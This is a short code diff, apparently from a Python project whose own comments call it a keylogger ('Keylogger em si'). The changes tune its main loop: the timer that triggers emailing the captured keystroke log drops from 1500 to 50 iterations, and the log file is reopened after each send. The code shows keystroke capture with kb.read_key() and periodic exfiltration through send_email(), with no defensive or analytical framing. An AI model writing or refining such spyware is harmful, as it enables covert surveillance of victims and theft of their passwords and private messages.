@@ -71,18 +71,21 @@ def send_email():
         print(f"Erro ao enviar o email: {e}")
 
 def main():
+    global file
+
     tempo = 0
     while True:
         try:
             # Timer + ou - funcional para o envio do email
-            if tempo < 1500:
+            if tempo < 50:
                 tempo += 1
-                print(tempo)
             else:
                 file.close()
                 send_email()
-                file = open(f"{path}{filename}", 'a')
                 tempo = 0
+
+                # Abrir o arquivo novamente para escrita
+                file = open(f"{path}{filename}", 'a')
 
             # Keylogger em si
             key = kb.read_key()
